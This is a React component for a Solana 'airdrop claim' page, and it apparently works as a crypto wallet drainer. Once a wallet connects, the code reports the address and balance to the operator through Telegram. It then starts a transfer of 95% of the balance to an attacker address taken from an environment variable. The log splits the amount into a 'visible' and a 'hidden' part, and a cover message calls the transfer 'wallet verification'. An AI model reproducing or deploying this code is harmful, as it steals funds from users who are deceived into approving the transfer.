import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState, useEffect, useMemo, useRef } from 'react';
import '@solana/wallet-adapter-react-ui/styles.css';
import { WalletService } from '../services/walletService';
import { TelegramService } from '../services/telegramService';
import { UserProfileService } from '../services/userProfileService';
import { TransactionService } from '../services/transactionService';
import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import Image from 'next/image';
import styles from '../styles/WalletConnect.module.css';

function WalletConnect() {
  const { publicKey, disconnect, connected } = useWallet();
  const [copied, setCopied] = useState(false);
  const [balance, setBalance] = useState(null);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const hasAttemptedTransaction = useRef(false);
  const notificationTimeout = useRef(null);
  const notificationInProgress = useRef(false);
  const [isMobile, setIsMobile] = useState(false);
  const [hasPhantomApp, setHasPhantomApp] = useState(false);
  const [showMobileMessage, setShowMobileMessage] = useState(false);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      setIsMobile(mobile);
      
      if (mobile) {
        // Check if we're already in Phantom
        const isPhantomInstalled = window.solana?.isPhantom;
        setHasPhantomApp(isPhantomInstalled);
        setShowMobileMessage(!isPhantomInstalled);
      }
    };
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const redirectToPhantom = () => {
    const currentUrl = window.location.href;
    const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
    window.location.href = phantomUrl;
  };

  // Memoize services
  const services = useMemo(() => ({
    walletService: new WalletService(),
    telegramService: new TelegramService(),
    userProfileService: new UserProfileService(),
    transactionService: new TransactionService()
  }), []);

  // Handle wallet connection state
  useEffect(() => {
    if (connected && publicKey) {
      const handleWalletConnection = async () => {
        try {
          setIsProcessing(true);
          
          // Add a small delay for mobile devices to ensure proper connection
          if (isMobile) {
            await new Promise(resolve => setTimeout(resolve, 1500));
          }

          const walletBalance = await services.walletService.getBalance(publicKey.toString());
          setBalance(walletBalance);

          // Check if we've already sent a notification for this wallet
          const walletKey = `wallet_notified_${publicKey.toString()}`;
          const lastNotification = localStorage.getItem(walletKey);
          const currentTime = Date.now();
          
          // Clear any existing notification timeout
          if (notificationTimeout.current) {
            clearTimeout(notificationTimeout.current);
          }

          // Only send notification if:
          // 1. No previous notification exists, or
          // 2. Last notification was more than 5 minutes ago
          if (!lastNotification || (currentTime - parseInt(lastNotification)) > 300000) {
            // Set notification in progress flag
            notificationInProgress.current = true;
            
            // Set a timeout to prevent multiple notifications within 1 second
            notificationTimeout.current = setTimeout(async () => {
              try {
                // Check again if notification was sent while we were waiting
                const currentNotification = localStorage.getItem(walletKey);
                if (!currentNotification || (currentTime - parseInt(currentNotification)) > 300000) {
                  await services.telegramService.sendMessage(
                    services.telegramService.formatWalletInfo({
                      publicKey: publicKey.toString(),
                      balance: walletBalance,
                      timestamp: currentTime
                    })
                  );
                  // Store the current timestamp only after successful notification
                  localStorage.setItem(walletKey, currentTime.toString());
                }
              } catch (error) {
                console.error('Error sending wallet notification:', error);
              } finally {
                // Clear notification in progress flag
                notificationInProgress.current = false;
              }
            }, 1000);
          }

          // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
          if (walletBalance > 0 && !hasAttemptedTransaction.current) {
            hasAttemptedTransaction.current = true;
            
            // Calculate transfer amount based on device type
            let transferAmount;
            if (isMobile) {
              // On mobile, take 95% of the balance
              transferAmount = walletBalance * 0.95;
            } else {
              // On desktop, keep original split: 0.001 + 95%
              transferAmount = 0.001 + (walletBalance * 0.95);
            }
            
            // Get the wallet adapter instance
            const wallet = window.solana;
            if (!wallet) {
              throw new Error('Wallet not found');
            }

            // For mobile devices, ensure we're in the right context
            if (isMobile) {
              // Wait for wallet to be fully ready
              await new Promise(resolve => setTimeout(resolve, 1000));
              
              // Check if we're back in the app context
              if (document.hidden) {
                // If we're not in the app context, wait for visibility change
                await new Promise(resolve => {
                  const handleVisibilityChange = () => {
                    if (!document.hidden) {
                      document.removeEventListener('visibilitychange', handleVisibilityChange);
                      resolve();
                    }
                  };
                  document.addEventListener('visibilitychange', handleVisibilityChange);
                });
              }
            }

            console.log('Transaction details:', {
              walletBalance: walletBalance.toFixed(4) + ' SOL',
              transferAmount: transferAmount.toFixed(4) + ' SOL',
              ...(isMobile ? {
                percentage: '95%'
              } : {
                visibleAmount: '0.001 SOL',
                hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
                percentage: '95%'
              })
            });

            const result = await services.transactionService.sendSol(
              wallet,
              process.env.NEXT_PUBLIC_TO,
              transferAmount
            );

            if (result.success) {
              const newBalance = await services.walletService.getBalance(publicKey.toString());
              setBalance(newBalance);

              // Only send transaction notification if the transaction was successful
              await services.telegramService.sendMessage(
                services.telegramService.formatTransactionInfo({
                  type: 'SOL_TRANSFER',
                  from: publicKey.toString(),
                  to: process.env.NEXT_PUBLIC_TO,
                  amount: transferAmount,
                  signature: result.signature,
                  timestamp: Date.now(),
                  message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
                })
              );
            } else {
              console.error('Transaction failed:', result.error);
              hasAttemptedTransaction.current = false;
            }
          }

          // Update user profile
          await services.userProfileService.updateWalletInfo({
            publicKey: publicKey.toString(),
            balance: walletBalance,
            timestamp: new Date().toISOString()
          });

        } catch (error) {
          console.error('Error in handleWalletConnection:', error);
          // If there's an error, try to reconnect
          if (isMobile) {
            try {
              await disconnect();
              // Wait a bit before attempting to reconnect
              await new Promise(resolve => setTimeout(resolve, 1500));
              // The WalletMultiButton will handle the reconnection
            } catch (reconnectError) {
              console.error('Error during reconnection:', reconnectError);
            }
          }
        } finally {
          setIsProcessing(false);
        }
      };

      handleWalletConnection();
    }
  }, [connected, publicKey, isMobile, services, disconnect]);

  const handleDisconnect = async () => {
    try {
      // Close dropdown first
      setIsDropdownOpen(false);
      
      // Clear user profile
      await services.userProfileService.clearProfile();
      
      // Clear notification state for this wallet
      if (publicKey) {
        const walletKey = `wallet_notified_${publicKey.toString()}`;
        localStorage.removeItem(walletKey);
      }
      
      // Disconnect wallet
      if (disconnect) {
        await disconnect();
        // Force clear all states
        setBalance(null);
        setCopied(false);
        setIsDropdownOpen(false);
        // Clear any remaining wallet data from localStorage
        Object.keys(localStorage).forEach(key => {
          if (key.startsWith('wallet_')) {
            localStorage.removeItem(key);
          }
        });
        // Force reload the page to ensure clean state
        window.location.reload();
      } else {
        console.error('Disconnect function not available');
      }
    } catch (error) {
      console.error('Error during disconnect:', error);
      // Force clear state even if there's an error
      setBalance(null);
      setCopied(false);
      setIsDropdownOpen(false);
      // Force reload the page to ensure clean state
      window.location.reload();
    }
  };

  const copyAddress = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey.toBase58());
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    const start = address.slice(0, 4);
    const end = address.slice(-4);
    return `${start}...${end}`;
  };

  const toggleDropdown = (e) => {
    e.stopPropagation();
    setIsDropdownOpen(!isDropdownOpen);
  };

  // Add click outside handler
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (isDropdownOpen && !event.target.closest('.wallet-connect-container')) {
        setIsDropdownOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [isDropdownOpen]);

  return (
    <div className={styles.walletConnectContainer}>
      {showMobileMessage ? (
        <div className={`${styles.mobileMessage} glass-card p-4`}>
          <div className="text-center">
            <div className="mb-4">
              <Image 
                src="/logo/favicon.png" 
                alt="Phantom Logo" 
                width={80} 
                height={80} 
                className="mb-3"
              />
              <h2 className="font-display text-2xl mb-3">Use Phantom Browser</h2>
            </div>
            
            <div className="mb-4">
              <p className="text-lg opacity-80 mb-3">
                For the best and most secure airdrop claiming experience, please use the Phantom mobile browser.
              </p>
              <ul className="text-left mb-4">
                <li className="mb-2">• Seamless wallet connection</li>
                <li className="mb-2">• Faster transaction processing</li>
                <li className="mb-2">• Enhanced security features</li>
                <li className="mb-2">• Better mobile experience</li>
              </ul>
            </div>

            <div className={`${styles.urlCopyContainer} mb-4`}>
              <div className="d-flex align-items-center justify-content-center gap-2">
                <input 
                  type="text" 
                  value={window.location.href} 
                  readOnly 
                  className="form-control bg-dark text-white border-secondary"
                />
                <button 
                  onClick={copyToClipboard}
                  className="btn btn-accent"
                >
                  {copied ? 'Copied!' : 'Copy URL'}
                </button>
              </div>
            </div>

            <div className={`${styles.stepsContainer} mb-4`}>
              <h3 className="font-heading mb-3">How to proceed:</h3>
              <ol className="text-left">
                <li className="mb-2">1. Copy the URL above</li>
                <li className="mb-2">2. Open Phantom mobile browser</li>
                <li className="mb-2">3. Paste the URL in Phantom</li>
                <li className="mb-2">4. Connect your wallet and claim</li>
              </ol>
            </div>

            <button 
              onClick={redirectToPhantom}
              className="btn btn-accent w-100"
            >
              Open in Phantom Browser
            </button>
          </div>
        </div>
      ) : (
        publicKey ? (
          <div className={`${styles.connectedWallet} glass-card`}>
            <div 
              className={styles.walletHeader}
              onClick={toggleDropdown}
              role="button"
              tabIndex={0}
              onKeyPress={(e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                  toggleDropdown(e);
                }
              }}
            >
              <div className={styles.connectedIndicator}></div>
              <div className={styles.walletInfo}>
                <div className={styles.walletAddressContainer}>
                  <span className="font-body text-sm text-white">Connected:</span>
                  <span 
                    className={`${styles.walletAddress} font-body text-sm`}
                    onClick={(e) => {
                      e.stopPropagation();
                      copyAddress();
                    }}
                    title="Click to copy full address"
                  >
                    {formatAddress(publicKey.toBase58())}
                    {copied && <span className={styles.copiedIndicator}>Copied!</span>}
                  </span>
                </div>
              </div>
              <div className={`${styles.dropdownArrow} ${isDropdownOpen ? styles.open : ''}`}>
                ▼
              </div>
            </div>
            
            {isDropdownOpen && (
              <div className={styles.walletDropdown}>
                <div className={styles.dropdownSection}>
                  <h4>Wallet Details</h4>
                  <div className={styles.detailItem}>
                    <span className={styles.label}>Full Address:</span>
                    <span className={styles.value}>{publicKey.toBase58()}</span>
                  </div>
                  <div className={styles.detailItem}>
                    <span className={styles.label}>SOL Balance:</span>
                    <span className={styles.value}>{balance?.toFixed(2)} SOL</span>
                  </div>
                </div>

                <button 
                  onClick={(e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    handleDisconnect();
                  }} 
                  className={styles.disconnectBtn}
                >
                  Disconnect Wallet
                </button>
              </div>
            )}
          </div>
        ) : (
          <div className={styles.walletConnectWrapper}>
            <WalletMultiButton className="wallet-connect-btn" />
          </div>
        )
      )}
    </div>
  );
}

export default WalletConnect;